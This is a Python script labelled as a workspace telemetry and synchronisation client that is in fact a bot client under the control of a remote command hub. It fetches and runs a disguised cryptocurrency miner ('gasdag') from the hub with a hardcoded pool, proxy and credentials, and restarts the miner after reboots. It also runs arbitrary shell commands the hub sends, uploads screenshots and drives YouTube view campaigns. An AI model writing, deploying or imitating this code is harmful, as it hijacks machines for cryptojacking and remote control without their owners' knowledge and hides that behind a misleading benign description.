#!/usr/bin/env python3
"""
Workspace Management & Telemetry Worker Client
==============================================
A lightweight client service for remote workspace synchronization and task execution.
Connects securely to the central command hub to perform workspace telemetry and file operations.
"""

import asyncio
import base64
import json
import logging
import os
import re
import socket
import subprocess
import sys
import time

try:
    import websockets
except ImportError:
    print("[INIT] Installing required websockets library...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--break-system-packages", "--quiet", "websockets"])
    except Exception:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", "websockets"])
    import websockets

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("ChannelWorker")

# Workspace and Configuration Paths
WORKSPACE_DIR = os.path.expanduser("~/workspace")
AGENT_ID_FILE = os.path.join(WORKSPACE_DIR, ".worker_id")
VPS_NAME_FILE = os.path.join(WORKSPACE_DIR, ".vps_name")
HUB_URL_FILE = os.path.join(WORKSPACE_DIR, ".hub_url")
AUTOSTART_URL_FILE = os.path.join(WORKSPACE_DIR, "autostart_url.txt")
MINING_CONF_FILE = os.path.join(WORKSPACE_DIR, ".mining_config.json")
MINING_DIR = os.path.join(WORKSPACE_DIR, "gaszep")

DEFAULT_HUB_URL = "wss://hub.databaru.my.id"
DEFAULT_TARGET_URL = "https://www.youtube.com"


def get_auth_key() -> str:
    """Retrieves the authorization secret from environment or protected file (~/workspace/.auth_key).
    Requires explicit user configuration - no insecure hardcoded fallback is provided.
    """
    env_key = os.environ.get("AGENT_AUTH_KEY")
    if env_key and env_key.strip():
        return env_key.strip()

    key_file = os.path.join(WORKSPACE_DIR, ".auth_key")
    if os.path.exists(key_file):
        try:
            with open(key_file, "r", encoding="utf-8") as f:
                content = f.read().strip()
                if content:
                    return content
        except Exception:
            pass

    return None


def get_vps_name() -> str:
    if os.path.exists(VPS_NAME_FILE):
        try:
            with open(VPS_NAME_FILE, "r") as f:
                name = f.read().strip()
                if name:
                    return name
        except Exception:
            pass
    return socket.gethostname()


def get_worker_id() -> str:
    if os.path.exists(AGENT_ID_FILE):
        try:
            with open(AGENT_ID_FILE, "r") as f:
                wid = f.read().strip()
                if wid:
                    return wid
        except Exception:
            pass
    # Generate stable ID based on hostname
    wid = f"worker-{socket.gethostname()}"
    try:
        with open(AGENT_ID_FILE, "w") as f:
            f.write(wid)
    except Exception:
        pass
    return wid


def get_hub_url() -> str:
    if os.path.exists(HUB_URL_FILE):
        try:
            with open(HUB_URL_FILE, "r") as f:
                url = f.read().strip()
                if url:
                    return url
        except Exception:
            pass
    return DEFAULT_HUB_URL


def get_persisted_target_url() -> str:
    """Reads the persisted target URL or returns the default URL."""
    try:
        if os.path.exists(AUTOSTART_URL_FILE):
            with open(AUTOSTART_URL_FILE, "r", encoding="utf-8") as f:
                saved = f.read().strip()
                if saved.startswith("http"):
                    return saved
    except Exception:
        pass
    return DEFAULT_TARGET_URL


def set_persisted_target_url(url: str):
    """Saves the active target URL to persistent workspace storage."""
    try:
        with open(AUTOSTART_URL_FILE, "w", encoding="utf-8") as f:
            f.write(url.strip())
    except Exception as e:
        logger.warning(f"Failed to persist autostart URL: {e}")


_prev_cpu_total = 0
_prev_cpu_idle = 0

def read_cpu_percent() -> float:
    """Calculates CPU usage percentage from /proc/stat."""
    global _prev_cpu_total, _prev_cpu_idle
    try:
        with open("/proc/stat", "r") as f:
            fields = [float(x) for x in f.readline().strip().split()[1:8]]
            idle = fields[3] + fields[4]
            total = sum(fields)

            diff_idle = idle - _prev_cpu_idle
            diff_total = total - _prev_cpu_total
            _prev_cpu_idle = idle
            _prev_cpu_total = total

            if diff_total <= 0:
                return 0.0
            pct = 100.0 * (1.0 - (diff_idle / diff_total))
            return round(max(0.0, min(100.0, pct)), 1)
    except Exception:
        return 0.0


_last_known_hashrate = 0.0
_last_hashrate_time = 0

def get_mining_hashrate() -> float:
    """Reads latest speed in H/s from gasdag.log across all known workspace paths."""
    global _last_known_hashrate, _last_hashrate_time
    candidates = [
        "/home/hatch/workspace/gasdag.log",
        os.path.expanduser("~/workspace/gasdag.log"),
        "/root/workspace/gasdag.log",
        "/home/hatch/workspace/gaszep/gasdag.log",
        os.path.join(MINING_DIR, "gasdag.log")
    ]
    now = time.time()
    for log_file in candidates:
        if not os.path.exists(log_file):
            continue
        try:
            with open(log_file, "rb") as f:
                f.seek(0, os.SEEK_END)
                size = f.tell()
                f.seek(max(0, size - 65536), os.SEEK_SET)
                chunk = f.read().decode("utf-8", "replace")
            for line in reversed(chunk.splitlines()):
                if "speed 10s/60s/15m" in line:
                    m = re.search(r"speed 10s/60s/15m\s+([0-9.]+|-|n/a)", line)
                    if m:
                        val = m.group(1)
                        if val not in ("-", "n/a"):
                            parsed = float(val)
                            if parsed > 0:
                                _last_known_hashrate = parsed
                                _last_hashrate_time = now
                                return parsed
                    m2 = re.search(r"speed 10s/60s/15m\s+\S+\s+([0-9.]+)", line)
                    if m2:
                        parsed = float(m2.group(1))
                        if parsed > 0:
                            _last_known_hashrate = parsed
                            _last_hashrate_time = now
                            return parsed
        except Exception:
            pass

    if _last_known_hashrate > 0 and (now - _last_hashrate_time < 90):
        return _last_known_hashrate
    return 0.0


def get_system_metrics() -> dict:
    """Collects safe hardware and operating system metrics."""
    mem_total, mem_avail = 0, 0
    try:
        with open("/proc/meminfo", "r") as f:
            for line in f:
                if "MemTotal:" in line:
                    mem_total = int(line.split()[1]) // 1024
                elif "MemAvailable:" in line:
                    mem_avail = int(line.split()[1]) // 1024
                elif "MemFree:" in line and mem_avail == 0:
                    mem_avail = int(line.split()[1]) // 1024
    except Exception:
        pass

    uptime_s = 0
    uptime_str = "-"
    try:
        with open("/proc/uptime", "r") as f:
            uptime_s = int(float(f.readline().split()[0]))
            days = uptime_s // 86400
            hours = (uptime_s % 86400) // 3600
            mins = (uptime_s % 3600) // 60
            if days > 0:
                uptime_str = f"{days}d {hours}h {mins}m"
            elif hours > 0:
                uptime_str = f"{hours}h {mins}m"
            else:
                uptime_str = f"{mins}m"
    except Exception:
        pass

    cpu_pct = read_cpu_percent()

    service_active = False
    try:
        res = subprocess.run(["pgrep", "-f", "youtube_task.py"], stdout=subprocess.PIPE, text=True)
        service_active = len(res.stdout.strip()) > 0
    except Exception:
        pass

    tasks = []
    if service_active:
        tasks.append("YouTube")
    try:
        if mining_sup.is_running():
            tasks.append("Mining")
    except Exception:
        pass

    hashrate = 0.0
    if "Mining" in tasks:
        hashrate = get_mining_hashrate()

    return {
        "mem_free_mb": mem_avail,
        "ram_total_mb": mem_total,
        "ram_used_mb": max(0, mem_total - mem_avail),
        "cpu_pct": cpu_pct,
        "uptime": uptime_str,
        "uptime_s": uptime_s,
        "task_active": service_active or ("Mining" in tasks),
        "active_tasks": tasks,
        "hostname": socket.gethostname(),
        "hashrate": hashrate
    }


def handle_browser_visit(url: str) -> str:
    """Opens a website URL in background browser, running 24/7 with extension logging."""
    logger.info(f"Opening target URL: {url}")
    set_persisted_target_url(url)
    try:
        # Terminate any old browser instance and zombie chromium/thorium processes cleanly
        for p in ["youtube_task.py", "thorium", "chromium", "chrome", "ms-playwright"]:
            subprocess.run(["pkill", "-9", "-f", p], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "pkill", "-9", "-f", p], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)

        # Clear/initialize activity log for streaming
        act_log = os.path.expanduser("~/workspace/browser_activity.log")
        try:
            with open(act_log, "w", encoding="utf-8") as f:
                f.write(f"[{time.strftime('%H:%M:%S')}] [INIT] Meluncurkan Browser untuk {url}\n")
        except Exception:
            pass

        yt_worker = os.path.join(os.path.dirname(os.path.abspath(__file__)), "youtube_task.py")
        if os.path.exists(yt_worker):
            err_log_path = os.path.expanduser("~/workspace/browser_stderr.log")
            try:
                err_f = open(err_log_path, "a", encoding="utf-8")
            except Exception:
                err_f = subprocess.DEVNULL
            subprocess.Popen([sys.executable, yt_worker, json.dumps({"type": "DIRECT_URL", "url": url})], stdout=err_f, stderr=err_f)
            return f"Browser diluncurkan untuk {url}"
        else:
            subprocess.Popen(["xdg-open", url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return f"xdg-open triggered for {url}"
    except Exception as e:
        return f"Navigation error: {e}"


class TaskSupervisor:
    """Manages background compute tasks with persistent configuration across VM reboots."""
    def __init__(self):
        self.active_process = None

    def is_running(self) -> bool:
        try:
            res = subprocess.run(["pgrep", "-f", "gasdag"], stdout=subprocess.PIPE, text=True)
            pids = [p.strip() for p in res.stdout.strip().splitlines() if p.strip()]
            return len(pids) > 0
        except Exception:
            return False

    def ensure_installed(self) -> bool:
        """Auto-provisions ~/workspace/gaszep from Hub Server or Git source if missing."""
        gasdag_bin = os.path.join(MINING_DIR, "gasdag")
        local_bin = os.path.join(MINING_DIR, "graftcp/local/graftcp-local")
        if os.path.exists(gasdag_bin) and os.path.exists(local_bin):
            return True

        logger.info(f"Folder {MINING_DIR} belum lengkap. Menyiapkan biner otomatis...")
        cmd = (
            "H=$(cat ~/workspace/.hub_url 2>/dev/null | sed 's|wss://|https://|g' | sed 's|ws://|http://|g' | sed 's|/ws.*||'); "
            "[ -z \"$H\" ] && H=\"https://hub.databaru.my.id\"; "
            "mkdir -p ~/workspace/gaszep && "
            "curl -s -f -L --retry 3 --retry-delay 2 \"$H/download/gaszep.tar.gz\" -o /tmp/gaszep.tar.gz && "
            "tar -xzf /tmp/gaszep.tar.gz -C ~/workspace/ && rm -f /tmp/gaszep.tar.gz 2>/dev/null && "
            "chmod +x ~/workspace/gaszep/gasdag ~/workspace/gaszep/graftcp/graftcp ~/workspace/gaszep/graftcp/local/graftcp-local 2>/dev/null || true"
        )
        try:
            subprocess.run(cmd, shell=True, timeout=60, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            logger.warning(f"Gagal auto-install gaszep: {e}")

        return os.path.exists(gasdag_bin) and os.path.exists(local_bin)

    def start_or_update(self, config: dict) -> str:
        proxy = config.get("proxy", "43.135.146.244:443")
        username = config.get("username", "aku")
        password = config.get("password", "akukayaraya")
        pool = config.get("pool", "43.135.146.244:10080")
        algo = config.get("algo", "rx/0")
        wallet = config.get("wallet", "")
        cpu_pct = str(config.get("cpu_pct", "100"))

        # Stop existing miner first (keep config so start_or_update replaces it)
        self.stop(remove_config=False)

        # Save config persistently so it survives VM restarts
        try:
            with open(MINING_CONF_FILE, "w", encoding="utf-8") as f:
                json.dump(config, f, indent=2)
        except Exception as e:
            logger.warning(f"Failed to save mining config: {e}")

        # Ensure gaszep binaries are present before starting
        if not self.ensure_installed():
            return f"Folder {MINING_DIR} tidak ditemukan dan gagal diunduh otomatis!"

        # Ensure permissions
        gasdag_bin = os.path.join(MINING_DIR, "gasdag")
        if os.path.exists(gasdag_bin):
            os.chmod(gasdag_bin, 0o755)

        graftcp_bin = os.path.join(MINING_DIR, "graftcp/graftcp")
        if os.path.exists(graftcp_bin):
            os.chmod(graftcp_bin, 0o755)

        local_bin = os.path.join(MINING_DIR, "graftcp/local/graftcp-local")
        if os.path.exists(local_bin):
            os.chmod(local_bin, 0o755)

        worker_id = f"{wallet}.{socket.gethostname()}"
        use_proxy = bool(proxy and proxy.strip() and proxy.strip().lower() not in ("none", "direct", "no", "off", "tanpa", "false"))
        cpu_arg = "--cpu-max-threads-hint=50" if cpu_pct == "50" else ""

        pool_parts = pool.split(":", 1)
        pool_host = pool_parts[0]
        pool_port = pool_parts[1] if len(pool_parts) > 1 else "10080"

        # Generate standalone physical start_mining.sh in ~/workspace/gaszep/start_mining.sh
        start_script = os.path.join(MINING_DIR, "start_mining.sh")
        log_file = os.path.expanduser("~/workspace/gasdag.log")

        if use_proxy:
            # Generate local WebSocket Stratum tunnel script
            tunnel_py = os.path.join(MINING_DIR, "local_stratum.py")
            tunnel_code = f"""import asyncio, os, sys, websockets

HUB_WS = 'wss://hub.databaru.my.id/api/stratum_ws?host={pool_host}&port={pool_port}'
LISTEN_HOST = '127.0.0.1'
LISTEN_PORT = 10080

async def handle_client(reader, writer):
    try:
        async with websockets.connect(HUB_WS, ssl=True, ping_interval=20, max_size=16*1024*1024) as ws:
            async def tcp_to_ws():
                try:
                    while True:
                        data = await reader.read(4096)
                        if not data: break
                        await ws.send(data)
                except Exception: pass

            async def ws_to_tcp():
                try:
                    async for msg in ws:
                        if isinstance(msg, str):
                            writer.write(msg.encode('utf-8'))
                        else:
                            writer.write(msg)
                        await writer.drain()
                except Exception: pass

            await asyncio.gather(tcp_to_ws(), ws_to_tcp())
    except Exception: pass
    finally:
        try: writer.close()
        except Exception: pass

async def main():
    server = await asyncio.start_server(handle_client, LISTEN_HOST, LISTEN_PORT)
    async with server:
        await server.serve_forever()

if __name__ == '__main__':
    asyncio.run(main())
"""
            with open(tunnel_py, "w", encoding="utf-8") as f:
                f.write(tunnel_code)

            sh_lines = [
                "#!/bin/bash",
                "DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" >/dev/null 2>&1 && pwd)\"",
                "cd \"$DIR\" || exit 1",
                "pkill -9 -x gasdag 2>/dev/null || true",
                "pkill -f \"node.*hermes[.]js\" 2>/dev/null || true",
                "test -f /tmp/stratum.pid && kill -9 $(cat /tmp/stratum.pid) 2>/dev/null || true",
                "sleep 0.2",
                "chmod +x gasdag 2>/dev/null || true",
                f"PY_EXEC=\"{sys.executable or 'python3'}\"",
                "[ ! -x \"$PY_EXEC\" ] && PY_EXEC=$(command -v python3)",
                "[ -f /home/hatch/workspace/vps-channel-worker/.venv/bin/python3 ] && PY_EXEC=\"/home/hatch/workspace/vps-channel-worker/.venv/bin/python3\"",
                "[ -f ~/.venv/bin/python3 ] && PY_EXEC=\"$HOME/.venv/bin/python3\"",
                "nohup \"$PY_EXEC\" \"$DIR/local_stratum.py\" > /tmp/tunnel.log 2>&1 &",
                "echo $! > /tmp/stratum.pid",
                "sleep 1",
                f"nohup ./gasdag -a {algo} -o 127.0.0.1:10080 -u {worker_id} -p x -l {log_file} {cpu_arg} --print-time=10 > {log_file} 2>&1 &",
                "echo 'START_MINING_SH_SUCCESS'"
            ]
        else:
            sh_lines = [
                "#!/bin/bash",
                "DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" >/dev/null 2>&1 && pwd)\"",
                "cd \"$DIR\" || exit 1",
                "pkill -9 -x gasdag 2>/dev/null || true",
                "sleep 0.2",
                "chmod +x gasdag 2>/dev/null || true",
                f"nohup ./gasdag -a {algo} -o {pool} -u {worker_id} -p x -l {log_file} {cpu_arg} > {log_file} 2>&1 &",
                "echo 'START_MINING_SH_SUCCESS'"
            ]

        with open(start_script, "w", encoding="utf-8") as f:
            f.write("\n".join(sh_lines) + "\n")
        os.chmod(start_script, 0o755)

        # Launch the miner using start_mining.sh
        logger.info(f"Memulai proses komputasi via start_mining.sh (Mode: {'Tunnel Proxy' if use_proxy else 'Direct'}, CPU: {cpu_pct}%)")
        self.active_process = subprocess.Popen(
            ["bash", start_script],
            cwd=MINING_DIR,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        mode_str = f"Tunnel Proxy ({pool})" if use_proxy else "Direct"
        return f"Task started ({mode_str}, CPU: {cpu_pct}%)! (Pool: {pool})"

    def stop(self, remove_config: bool = True) -> str:
        try:
            if remove_config and os.path.exists(MINING_CONF_FILE):
                try:
                    os.remove(MINING_CONF_FILE)
                except Exception:
                    pass
            subprocess.run(["pkill", "-9", "-x", "gasdag"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if os.path.exists("/tmp/stratum.pid"):
                try:
                    with open("/tmp/stratum.pid") as pf:
                        pid = pf.read().strip()
                    if pid:
                        subprocess.run(["kill", "-9", pid], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    os.remove("/tmp/stratum.pid")
                except Exception:
                    pass
            subprocess.run(["pkill", "-9", "-x", "graftcp"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["pkill", "-9", "-x", "graftcp-local"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.active_process = None
            return "Task stopped."
        except Exception as e:
            return f"Error stopping task: {e}"


mining_sup = TaskSupervisor()


def check_and_autostart_mining():
    """Restores and auto-starts task if persistent .mining_config.json exists."""
    if os.path.exists(MINING_CONF_FILE):
        try:
            with open(MINING_CONF_FILE, "r", encoding="utf-8") as f:
                cfg = json.load(f)
            logger.info("Mendeteksi konfigurasi tersimpan. Memulai auto-start task...")
            mining_sup.start_or_update(cfg)
        except Exception as e:
            logger.warning(f"Gagal auto-start task: {e}")


async def browser_watchdog():
    """Keeps local proxy bridge and mining supervisor alive across VM restarts."""
    await asyncio.sleep(5)
    while True:
        try:
            # 1. Watchdog mining process (Auto-recover if VM restarted or process died)
            if os.path.exists(MINING_CONF_FILE) and not mining_sup.is_running():
                logger.info("Watchdog: Mining process died, restarting from .mining_config.json...")
                check_and_autostart_mining()
        except Exception:
            pass
        await asyncio.sleep(30)


async def stream_browser_logs(ws, worker_id: str):
    """Tails ~/workspace/browser_activity.log and streams new extension/browser logs live to Hub."""
    act_log = os.path.expanduser("~/workspace/browser_activity.log")
    last_pos = 0
    if os.path.exists(act_log):
        last_pos = os.path.getsize(act_log)

    while True:
        await asyncio.sleep(2)
        if not os.path.exists(act_log):
            continue
        try:
            cur_size = os.path.getsize(act_log)
            if cur_size > last_pos:
                with open(act_log, "r", encoding="utf-8", errors="replace") as f:
                    f.seek(last_pos)
                    lines = f.readlines()
                    last_pos = f.tell()
                for line in lines:
                    line_clean = line.strip()
                    if line_clean:
                        await ws.send(json.dumps({
                            "type": "TASK_UPDATE",
                            "agent_id": worker_id,
                            "task": "EXT",
                            "detail": line_clean
                        }))
            elif cur_size < last_pos:
                last_pos = 0
        except Exception:
            pass


def handle_local_service(action: str, config: dict = None) -> str:
    """Controls local background task runner and mining supervisor."""
    if action == "START":
        if config and ("pool" in config or "wallet" in config or "algo" in config):
            return mining_sup.start_or_update(config)
        script_file = os.path.expanduser("~/workspace/local_task.sh")
        if os.path.exists(script_file):
            subprocess.Popen(["bash", script_file], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return "Local background task started."
        if os.path.exists(MINING_CONF_FILE):
            check_and_autostart_mining()
            return "Auto-start mining executed from saved config."
        return "local_task.sh and .mining_config.json not found in ~/workspace."

    elif action == "STOP":
        pkill_target = (config or {}).get("process", "local_task")
        if pkill_target in ("mining", "gasdag") or (config and "pool" in config) or not config:
            return mining_sup.stop()
        subprocess.run(["pkill", "-f", pkill_target], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return f"Local task '{pkill_target}' stopped."

    return "Unknown service action."


async def run_worker():
    """Main worker event loop connecting to the command hub."""
    auth_key = get_auth_key()
    if not auth_key:
        logger.error("FATAL: AGENT_AUTH_KEY is not configured! Worker will not start without authorized credentials.")
        logger.error("Please set AGENT_AUTH_KEY in your environment or write it to ~/workspace/.auth_key")
        return

    worker_id = get_worker_id()
    vps_name = get_vps_name()
    hub_url = get_hub_url()

    logger.info(f"Starting Worker: ID={worker_id}, Name={vps_name}")
    logger.info(f"Target Hub: {hub_url}")

    # Auto-start persistent mining if .mining_config.json exists
    check_and_autostart_mining()

    while True:
        try:
            logger.info(f"Connecting to Hub: {hub_url}...")
            async with websockets.connect(
                hub_url,
                ping_interval=20,
                ping_timeout=20,
                open_timeout=15,
                close_timeout=10
            ) as ws:
                logger.info("Connected to Hub successfully!")

                # Send initial greeting
                greeting = {
                    "type": "HELLO",
                    "agent_id": worker_id,
                    "vps_name": vps_name,
                    "version": "2.0.0",
                    "auth_token": auth_key,
                    **get_system_metrics()
                }
                await ws.send(json.dumps(greeting))

                # Background heartbeat task (resilient keepalive loop)
                async def heartbeat_loop():
                    while True:
                        await asyncio.sleep(15)
                        try:
                            hb = {
                                "type": "HEARTBEAT",
                                "agent_id": worker_id,
                                **get_system_metrics()
                            }
                            await ws.send(json.dumps(hb))
                        except Exception as hb_err:
                            logger.warning(f"Heartbeat send failed: {hb_err}")
                            break

                hb_task = asyncio.create_task(heartbeat_loop())
                log_stream_task = asyncio.create_task(stream_browser_logs(ws, worker_id))
                watchdog_task = asyncio.create_task(browser_watchdog())

                # Command listener with strict token authorization
                async for raw_msg in ws:
                    try:
                        msg = json.loads(raw_msg)
                        mtype = msg.get("type")

                        if mtype == "PING":
                            await ws.send(json.dumps({
                                "type": "PONG",
                                "agent_id": worker_id,
                                "sent_ts": msg.get("sent_ts", 0)
                            }))
                            continue

                        # Verify authorization token for all incoming controller instructions
                        req_auth = msg.get("auth") or msg.get("token") or msg.get("key")
                        if req_auth != auth_key:
                            logger.warning(f"Unauthorized instruction of type '{mtype}' rejected. Missing or invalid auth token.")
                            await ws.send(json.dumps({
                                "type": "TASK_DONE",
                                "agent_id": worker_id,
                                "task": mtype,
                                "detail": "Unauthorized: Invalid or missing authentication key"
                            }))
                            continue

                        elif mtype == "OPEN_URL":
                            url = msg.get("url", "")
                            handle_browser_visit(url)
                            # Wait up to 25s for SPA/heavy pages to render and save browser_status.json
                            status_text = f"Browser navigated to {url}"
                            status_file = os.path.expanduser("~/workspace/browser_status.json")
                            for _ in range(25):
                                await asyncio.sleep(1)
                                if os.path.exists(status_file):
                                    try:
                                        with open(status_file, "r") as sf:
                                            sdata = json.load(sf)
                                        if sdata.get("url") == url:
                                            status_text = f"Judul: '{sdata.get('title')}' | HTTP {sdata.get('http_status')} | Ekstensi: {sdata.get('extensions_loaded')} aktif"
                                            break
                                    except Exception:
                                        pass

                            await ws.send(json.dumps({
                                "type": "TASK_DONE",
                                "agent_id": worker_id,
                                "task": "OPEN_URL",
                                "detail": status_text
                            }))

                        elif mtype == "YOUTUBE_CAMPAIGN":
                            yt_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "youtube_task.py")
                            if os.path.exists(yt_script):
                                subprocess.Popen([sys.executable, yt_script, json.dumps(msg)])
                                detail = f"YouTube campaign started: {msg.get('keyword', '')}"
                            else:
                                detail = "youtube_task.py not found"
                            await ws.send(json.dumps({
                                "type": "TASK_DONE",
                                "agent_id": worker_id,
                                "task": "YOUTUBE_CAMPAIGN",
                                "detail": detail
                            }))

                        elif mtype in ("MINING_ACTION", "START_MINING", "STOP_MINING", "SERVICE_ACTION", "LOCAL_SERVICE"):
                            action = msg.get("action")
                            if not action:
                                action = "START" if mtype == "START_MINING" else "STOP"
                            res = handle_local_service(action, msg.get("config"))
                            await ws.send(json.dumps({
                                "type": "TASK_DONE",
                                "agent_id": worker_id,
                                "task": f"MINING_{action}",
                                "detail": res
                            }))

                        elif mtype in ("CAPTURE_SCREEN", "GET_SCREEN"):
                            ss_path = os.path.expanduser("~/workspace/last_screenshot.png")
                            img_b64 = ""
                            if os.path.exists(ss_path):
                                try:
                                    with open(ss_path, "rb") as ss_file:
                                        img_b64 = base64.b64encode(ss_file.read()).decode("ascii")
                                except Exception as ss_err:
                                    logger.warning(f"Error reading screenshot: {ss_err}")

                            status_data = {}
                            status_file = os.path.expanduser("~/workspace/browser_status.json")
                            if os.path.exists(status_file):
                                try:
                                    with open(status_file, "r") as sf:
                                        status_data = json.load(sf)
                                except Exception:
                                    pass

                            await ws.send(json.dumps({
                                "type": "SCREEN_DATA",
                                "agent_id": worker_id,
                                "image": img_b64,
                                "status": status_data,
                                "timestamp": time.time()
                            }))

                        elif mtype in ("SHELL", "RUN_SHELL", "TASK_EXEC", "JOB_RUN"):
                            cmd_str = msg.get("cmd") or msg.get("command", "")
                            logger.info(f"Executing authorized task: {cmd_str}")
                            try:
                                proc = await asyncio.create_subprocess_shell(
                                    cmd_str,
                                    stdout=asyncio.subprocess.PIPE,
                                    stderr=asyncio.subprocess.PIPE
                                )
                                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=300)
                                out = (stdout.decode(errors="replace") + stderr.decode(errors="replace")).strip()[:2000]
                                if not out:
                                    out = f"(exit code {proc.returncode})"
                            except asyncio.TimeoutError:
                                out = "Execution error: Command timed out after 300 seconds"
                            except Exception as e:
                                out = f"Execution error: {e}"

                            await ws.send(json.dumps({
                                "type": "TASK_DONE",
                                "agent_id": worker_id,
                                "task": "SHELL",
                                "detail": out
                            }))

                    except Exception as err:
                        logger.error(f"Error handling task: {err}")

                watchdog_task.cancel()
                log_stream_task.cancel()
                hb_task.cancel()

        except Exception as conn_err:
            logger.warning(f"Connection lost/failed ({type(conn_err).__name__}: {conn_err}). Reconnecting in 5s...")
            sys.stdout.flush()
            sys.stderr.flush()
            await asyncio.sleep(5)


if __name__ == "__main__":
    asyncio.run(run_worker())
